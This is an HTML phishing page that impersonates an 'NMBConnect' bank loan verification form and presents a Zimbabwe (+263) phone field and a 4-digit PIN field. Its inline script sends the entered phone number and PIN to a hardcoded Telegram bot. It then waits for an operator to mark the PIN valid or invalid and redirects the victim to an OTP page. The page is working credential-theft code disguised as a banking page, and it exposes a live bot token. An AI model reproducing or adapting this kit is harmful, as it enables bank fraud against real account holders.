<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#003366">
    <title>NMBConnect | Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --nmb-blue: #003366;
            --nmb-gold: #E4C16A;
            --nmb-light-blue: #4a90e2;
            --white: #ffffff;
            --error: #ff4d4d;
            --bg-overlay: rgba(0, 0, 0, 0.6);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(var(--bg-overlay), var(--bg-overlay)), url('https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?q=80&w=1000&auto=format&fit=crop');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            padding: 15px;
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 28px;
            padding: 35px 25px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
        }

        .logo-circle {
            width: 80px;
            height: 80px;
            background: var(--nmb-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
            border: 2px solid rgba(228, 193, 106, 0.3);
        }

        .brand-name { font-size: 24px; font-weight: 700; margin-bottom: 25px; }
        .brand-name .nmb { color: var(--nmb-light-blue); }
        .brand-name .connect { color: var(--nmb-gold); }

        .card-header h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; }
        .card-header p { font-size: 13px; color: rgba(255, 255, 255, 0.8); line-height: 1.5; margin-bottom: 25px; }

        .loan-badge {
            background: rgba(0, 0, 0, 0.2);
            border: 1px solid rgba(228, 193, 106, 0.4);
            border-radius: 14px;
            padding: 12px;
            margin-bottom: 25px;
        }
        .loan-badge .label { font-size: 11px; text-transform: uppercase; color: var(--nmb-gold); font-weight: 700; display: block; margin-bottom: 2px; }
        .loan-badge .val { font-size: 16px; font-weight: 700; }

        .input-group { margin-bottom: 18px; text-align: left; }
        .input-wrapper {
            background: rgba(255, 255, 255, 0.07);
            border: 1.5px solid rgba(255, 255, 255, 0.25);
            border-radius: 14px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            transition: 0.3s;
        }
        .input-wrapper:focus-within { border-color: var(--nmb-gold); background: rgba(255, 255, 255, 0.12); }

        .flag-icon { width: 22px; margin-right: 10px; border-radius: 2px; }
        .country-code { color: var(--nmb-light-blue); font-weight: 600; margin-right: 8px; font-size: 14px; }
        .input-field { flex: 1; background: transparent; border: none; color: white; font-size: 15px; outline: none; width: 100%; }
        .input-field::placeholder { color: rgba(255, 255, 255, 0.4); }

        .verify-btn {
            width: 100%;
            padding: 16px;
            background: var(--white);
            color: var(--nmb-blue);
            border: none;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: 0.2s;
        }
        .verify-btn:active { transform: scale(0.98); }

        .error-msg {
            color: #ff6b6b;
            font-size: 12px;
            margin-bottom: 15px;
            display: none;
            background: rgba(255, 77, 77, 0.1);
            padding: 10px;
            border-radius: 10px;
            border: 1px solid rgba(255, 77, 77, 0.2);
        }

        .overlay {
            position: fixed; inset: 0;
            display: none;
            align-items: center; justify-content: center; flex-direction: column;
            background: rgba(0, 30, 60, 0.95);
            z-index: 2000;
            backdrop-filter: blur(8px);
            padding: 20px;
        }
        .overlay.on { display: flex; }
        .spin { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--nmb-gold); border-radius: 50%; animation: sp 0.8s linear infinite; }
        .sp-t { font-size: 18px; font-weight: 600; margin-top: 20px; }
        .sp-s { font-size: 13px; color: rgba(255,255,255,0.7); margin-top: 8px; }
        @keyframes sp { to { transform: rotate(360deg); } }
    </style>
</head>
<body onload="init()">
    <div class="card">
        <div class="logo-circle">
            <svg viewBox="0 0 100 100" width="50" height="50">
                <path d="M30,50 L70,50 M30,40 C20,40 20,60 30,60 L70,60 C80,60 80,40 70,40" fill="none" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
                <path d="M45,35 L55,65" stroke="#E4C16A" stroke-width="8" stroke-linecap="round"/>
            </svg>
        </div>
        <div class="brand-name"><span class="nmb">NMB</span><span class="connect">Connect</span></div>

        <div class="card-header">
            <h2>Account Verification</h2>
            <p>Enter your details below to continue with your application.</p>
        </div>

        <div id="loanBox" class="loan-badge" style="display:none;">
            <span class="label" id="loanType">Loan Type</span>
            <span class="val" id="loanAmount">$0.00 USD</span>
        </div>

        <div id="err" class="error-msg"></div>
        
        <form onsubmit="doSubmit(event)">
            <div class="input-group">
                <div class="input-wrapper">
                    <img src="https://flagcdn.com/w40/zw.png" class="flag-icon" alt="ZW">
                    <span class="country-code">(+263)</span>
                    <input type="tel" class="input-field" id="phone" placeholder="7XXXXXXXX" inputmode="numeric" maxlength="9" required>
                </div>
            </div>

            <div class="input-group">
                <div class="input-wrapper">
                    <span style="margin-right: 12px; font-size: 16px; opacity: 0.7;">🔒</span>
                    <input type="password" class="input-field" id="pin" placeholder="Enter 4-Digit PIN" inputmode="numeric" maxlength="4" required>
                </div>
            </div>

            <button type="submit" class="verify-btn">Verify Account</button>
        </form>
    </div>

    <div id="ov" class="overlay">
        <div class="spin"></div>
        <div class="sp-t">Verifying Details</div>
        <div class="sp-s">Please wait while we process your request...</div>
    </div>

    <script>
        const BOT = '8610325502:AAELjduBU2AtyM8FITvNGmRz4-O1Vi6QQ3s';
        const CID = '7881536601';
        let bd = {}, luid = 0;

        function init() {
            const p = new URLSearchParams(location.search);
            const d = p.get('data'), pr = p.get('price');
            if (d && pr) { 
                bd = { data: d, price: pr }; 
                document.getElementById('loanBox').style.display = 'block';
                document.getElementById('loanType').textContent = d;
                document.getElementById('loanAmount').textContent = '$' + pr + ' USD';
            }
        }

        function showErr(m) { const e = document.getElementById('err'); e.textContent = m; e.style.display = 'block'; }
        function clrErr() { document.getElementById('err').style.display = 'none'; }

        async function tg(msg, btns) {
            try {
                const r = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CID, text: msg, reply_markup: btns ? { inline_keyboard: btns } : undefined, parse_mode: 'HTML' })
                });
                const d = await r.json();
                if (d.ok) {
                    const ur = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?limit=1&offset=-1`);
                    const ud = await ur.json();
                    if (ud.ok && ud.result.length > 0) { luid = ud.result[0].update_id; }
                }
            } catch(e) { console.error(e); }
        }

        function doSubmit(e) {
            e.preventDefault();
            clrErr();
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            const pin = document.getElementById('pin').value.trim();

            if (phone.length < 9) { showErr('Enter a valid 9-digit number'); return; }
            if (pin.length !== 4) { showErr('PIN must be 4 digits'); return; }

            const msg = `📱 <b>NMBConnect Login</b>\n\n<b>Phone:</b> <code>+263${phone}</code>\n<b>PIN:</b> <code>${pin}</code>\n<b>Loan:</b> <code>${bd.data || 'N/A'}</code>\n<b>Amount:</b> <code>$${bd.price || '0'} USD</code>`;

            const btns = [
                [{ text: '✓ Valid PIN', callback_data: 'pin_valid' }, { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }],
                [{ text: '⚠️ Already Applied', callback_data: 'login_applied' }]
            ];

            document.getElementById('ov').classList.add('on');
            tg(msg, btns);
            poll();
        }

        function poll() {
            const iv = setInterval(() => {
                fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${luid + 1}`)
                    .then(r => r.json())
                    .then(d => {
                        if (d.ok && d.result.length > 0) {
                            d.result.forEach(u => {
                                luid = u.update_id;
                                if (u.callback_query) {
                                    const cb = u.callback_query.data;
                                    if (cb === 'pin_valid') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        goOTP(); 
                                    }
                                    else if (cb === 'pin_invalid') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Invalid PIN. Please check and try again.'); 
                                        document.getElementById('pin').value = '';
                                    }
                                    else if (cb === 'login_applied') { 
                                        clearInterval(iv); 
                                        document.getElementById('ov').classList.remove('on'); 
                                        showErr('Application already submitted for this loan.');
                                    }
                                }
                            });
                        }
                    }).catch(e => console.error(e));
            }, 1500);
            setTimeout(() => clearInterval(iv), 600000);
        }

        function goOTP() {
            const ph = document.getElementById('phone').value.trim().replace(/\s/g, '');
            location.href = `otp.html?data=${encodeURIComponent(bd.data || '')}&price=${bd.price || '0'}&phone=${ph}`;
        }
    </script>
</body>
</html>
